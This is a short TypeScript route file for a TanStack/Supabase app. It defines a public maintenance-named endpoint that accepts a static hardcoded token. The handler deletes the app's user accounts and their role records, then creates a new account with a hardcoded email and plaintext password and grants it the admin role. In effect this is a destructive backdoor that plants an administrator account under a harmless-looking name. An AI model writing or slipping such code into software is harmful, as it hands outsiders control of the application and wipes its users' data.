import { createFileRoute } from '@tanstack/react-router'

export const Route = createFileRoute('/api/public/temp-reset-users')({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const token = request.headers.get('x-maint-token')
        if (token !== 'sk-maint-2026-reset') {
          return new Response('Invalid token', { status: 401 })
        }
        const { supabaseAdmin } = await import('@/integrations/supabase/client.server')

        const { data: list, error: listErr } = await supabaseAdmin.auth.admin.listUsers({
          page: 1,
          perPage: 200,
        })
        if (listErr) return new Response(listErr.message, { status: 500 })

        const deleted: string[] = []
        for (const u of list.users) {
          await supabaseAdmin.from('user_roles').delete().eq('user_id', u.id)
          const { error } = await supabaseAdmin.auth.admin.deleteUser(u.id)
          if (!error) deleted.push(u.email ?? u.id)
        }

        const { data: created, error: createErr } = await supabaseAdmin.auth.admin.createUser({
          email: 'hasanyounes5412@gmail.com',
          password: '7644218QweAsd5412@',
          email_confirm: true,
        })
        if (createErr) return new Response(createErr.message, { status: 500 })

        const { error: roleErr } = await supabaseAdmin
          .from('user_roles')
          .insert({ user_id: created.user!.id, role: 'admin' })
        if (roleErr) return new Response(roleErr.message, { status: 500 })

        return Response.json({ deleted, created: created.user!.email })
      },
    },
  },
})
